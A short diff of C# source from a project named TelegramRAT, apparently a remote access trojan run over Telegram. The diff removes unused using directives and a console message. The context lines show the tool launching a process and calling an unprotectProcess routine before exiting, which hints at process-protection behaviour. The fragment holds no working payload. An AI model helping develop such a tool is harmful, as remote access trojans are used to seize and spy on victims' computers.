@@ -8,14 +8,11 @@
 
 using System;
 using System.Collections.Generic;
-using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
 using System.Management;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Security.AccessControl;
-using System.Security.Principal;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -330,7 +327,6 @@ namespace TelegramRAT
                         proc.Start();
                         proc.WaitForExit();
                         unprotectProcess();
-                        Console.WriteLine("Done!");
                         Environment.Exit(1);
                     }
                     catch (System.ComponentModel.Win32Exception)
